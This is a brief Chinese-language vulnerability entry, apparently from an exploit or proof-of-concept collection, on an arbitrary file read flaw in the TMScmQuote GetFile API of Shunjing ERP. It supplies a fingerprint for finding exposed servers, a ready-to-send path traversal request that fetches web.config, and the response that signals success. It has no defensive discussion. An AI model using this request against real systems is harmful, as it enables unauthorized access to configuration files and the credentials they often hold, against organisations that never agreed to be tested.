# 顺景ERPTMScmQuoteGetFile任意文件读取漏洞

顺景ERPTMScmQuoteGetFile ｜ 任意文件读取/写入 ｜ —
- **指纹**：`body="顺景软件 WebAPI 服务端"`
- **请求**：`GET /api/TMScmQuote/GetFile?FullGuidFileName=/../web.config&FileName= HTTP/1.1`
- **响应特征**：200